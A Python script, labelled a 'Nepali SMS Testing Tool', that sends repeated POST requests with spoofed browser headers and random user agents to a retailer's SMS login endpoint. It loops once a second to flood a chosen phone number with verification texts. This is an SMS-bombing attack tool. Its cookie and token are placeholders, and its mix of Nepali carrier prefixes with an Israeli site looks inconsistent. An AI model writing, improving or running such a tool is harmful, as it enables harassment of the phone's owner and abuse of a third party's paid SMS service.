import requests
from fake_useragent import UserAgent
import time

# Function to clear terminal screen
def clear():
    pass  # You can implement this if needed for your OS.

ua = UserAgent()

def request1(phone_num):
    random_user_agent = ua.random  # Renamed for clarity

    # Strip the country code if present
    if phone_num.startswith("+977"):
        phone_num = phone_num[4:].strip()  # Remove '+977' and any extra spaces

    # Check if phone number has a valid length
    if len(phone_num) != 10:
        print("Invalid phone number. Please ensure the phone number is 10 digits long.")
        return

    # Set a default value for extension
    extension = "00"  # Default extension, change as needed

    # Assign extensions based on Nepali carrier prefixes
    if phone_num[:3] == "981" or phone_num[:3] == "982":  # Ncell numbers
        extension = "981"
    elif phone_num[:3] == "984" or phone_num[:3] == "985":  # NTC numbers
        extension = "984"
    elif phone_num[:3] == "986":  # NTC numbers
        extension = "986"
    elif phone_num[:3] == "972":  # SmartCell numbers
        extension = "972"
    elif phone_num[:3] == "961" or phone_num[:3] == "962":  # UTL numbers
        extension = "961"

    # Trim the phone number
    after_phone = phone_num[3:]

    url = "https://www.braha.co.il/frontend/check_phone"
    headers = {
        "Cookie": "promo_modal=your_cookie_here",
        "Content-Length": "104",
        "Sec-Ch-Ua": "\"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Sec-Ch-Ua-Mobile": "?0",
        "User-Agent": random_user_agent,
        "Sec-Ch-Ua-Platform": "\"Linux\"",
        "Origin": "https://www.braha.co.il",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.braha.co.il/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i"
    }

    data = {
        "login_message_type": "sms",
        "extension": f"{extension}",
        "phone_number": f"{after_phone}",
        "_token": "your_dynamic_token_here"
    }

    # Send request
    response = requests.post(url, headers=headers, data=data)
    print(f"Request sent to {phone_num} with extension {extension}")
    print(f"Status Code: {response.status_code}, Response: {response.text}")

def main_menu():
    while True:
        clear()
        print("Welcome to Nepali SMS Testing Tool")
        print("1. Start sending SMS to a phone number")
        print("2. Exit")
        choice = input("Enter your choice: ")

        if choice == "1":
            clear()
            phone_num = input("Enter the phone number (in format +977 XXXXXXXX): ")
            try:
                count = 0
                print("Press Ctrl+C to stop.")
                while True:
                    request1(phone_num)
                    count += 1
                    print(f"Messages sent: {count}", end='\r')
                    time.sleep(1)  # Adding a delay to prevent overwhelming the server

            except KeyboardInterrupt:
                print("\nProcess stopped.")
                exit(0)

        elif choice == "2":
            print("Goodbye!")
            exit(0)

        else:
            print("Invalid choice. Try again.")

if __name__ == "__main__":
    main_menu()
